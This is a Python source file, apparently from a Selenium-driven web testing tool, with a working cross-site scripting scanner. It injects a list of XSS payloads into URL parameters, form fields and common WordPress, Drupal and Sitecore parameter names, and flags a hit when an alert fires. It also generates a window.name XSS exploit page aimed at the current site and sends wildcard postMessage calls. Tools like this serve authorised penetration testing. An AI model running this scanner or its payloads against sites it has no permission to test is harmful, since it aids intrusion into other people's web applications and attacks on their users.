from selenium.common.exceptions import UnexpectedAlertPresentException
from selenium.webdriver.common.by import By
import time
from libs.utils.logger import FileLogger

class XSSCommands:
    def __init__(self, webdriver, logger=None):
        self.version = 2.0
        self.driver = webdriver
        self.logger = logger or FileLogger()
        
        
    def find_xss(self):
        self.logger.log("finding xss...")
        current_url = self.driver.current_url
        suggestor = XSS_Url_Suggestor(current_url, self.driver)
        urls_to_try = suggestor.get_xss_urls()
        self.logger.log("url is %s"%current_url)
        self.logger.log('')
        for x in urls_to_try:
            try:
                self.driver.get(x)
                time.sleep(2)
                self.driver.get(current_url)
            except UnexpectedAlertPresentException:
                self.logger.log("XSS - " + x)
            except Exception as e:
                self.logger.error(f'Error during XSS check: {e}')
        self.logger.log('')
        self.logger.log('')
        input("Press ENTER to return to menu.")

    def create_window_name_exploit(self, payload=None, filename="windowname.html"):
        if payload is None:
            payload = "<script>alert('XSS')</script>"
        target_url = self.driver.current_url
        html = f"<script>window.name='{payload}';location='{target_url}';</script>"
        try:
            with open(filename, "w") as f:
                f.write(html)
            self.logger.log(f"Exploit file written to {filename}")
        except Exception as exc:
            self.logger.error(f"Failed to write exploit file: {exc}")
        input("Press ENTER to return to menu.")

    def test_post_message(self, message=None):
        if message is None:
            message = "test"
        script = f"window.postMessage('{message}', '*');"
        try:
            self.driver.execute_script(script)
            self.logger.log("postMessage sent")
        except Exception as exc:
            self.logger.error(f"Failed to send postMessage: {exc}")
        input("Press ENTER to return to menu.")
        


class XSS_Url_Suggestor:
    xss_attacks = ['<script>alert(1)</script>',
                   '</script><script>alert(1)</script>',
                   '<img src=x onerror="alert(1)" />',
                   "'/><img src=x onerror='alert(1)' />",
                   '"/><img src=x onerror="alert(1)" />',
                   ';alert(1);',
                   '";alert(1);',
                   "';alert(1);",
                   '--><script>alert(1)</script>',
                   '</title><script>alert(1)</script>',
                   '<TABLE BACKGROUND="javascript:alert(\'XSS\')">',
                   '<TD BACKGROUND="javascript:alert(\'XSS\')">',
                   '<IFRAME SRC="javascript:alert(\'XSS\');"></IFRAME>',
                   '<BGSOUND SRC="javascript:alert(\'XSS\');">']

    # Common parameter names found across many web applications.  The list has
    # been extended with parameters typically used by popular CMS platforms
    # such as WordPress, Drupal and Sitecore to improve XSS payload coverage.
    common_param_names = [
        # Generic parameters
        'search', 'query', 'id', 'page', 'q',
        # WordPress specific
        's', 'cat', 'tag', 'author', 'p', 'page_id', 'name',
        # Drupal specific
        'nid', 'node', 'type', 'search_api_fulltext',
        # Sitecore specific
        'sc_mode', 'sc_lang', 'sc_itemid', 'sc_site', 'sc_template',
        'sc_version'
    ]

    def __init__(self, url, driver=None):
        self.version = 2.0
        self.url = url
        self.driver = driver

    def _existing_params(self):
        params = {}
        urlsplitloc = self.url.find("?")
        if urlsplitloc >= 0:
            paramstring = self.url[urlsplitloc+1:]
            if paramstring:
                pairs = paramstring.split('&')
                for single in pairs:
                    if '=' in single:
                        key, value = single.split('=', 1)
                    else:
                        key, value = single, ''
                    params[key] = value
        return params

    def _form_field_names(self):
        names = set()
        if not self.driver:
            return names
        try:
            elements = self.driver.find_elements(By.XPATH, "//form//input[@name] | //form//textarea[@name] | //form//select[@name]")
            for element in elements:
                name = element.get_attribute("name")
                if name:
                    names.add(name)
        except Exception:
            pass
        return names

    def get_xss_urls(self):
        rtnData = []

        existing_params = self._existing_params()
        param_names = set(existing_params.keys())
        param_names.update(self._form_field_names())
        param_names.update(self.common_param_names)

        base_url = self.url.split("?")[0]
        base_query = "&".join(f"{k}={v}" for k, v in existing_params.items())

        for name in param_names:
            for payload in self.xss_attacks:
                if name in existing_params:
                    replaced = existing_params.copy()
                    replaced[name] = payload
                    query = "&".join(f"{k}={v}" for k, v in replaced.items())
                else:
                    if base_query:
                        query = base_query + f"&{name}={payload}"
                    else:
                        query = f"{name}={payload}"
                rtnData.append(base_url + "?" + query)

        return rtnData
        
        
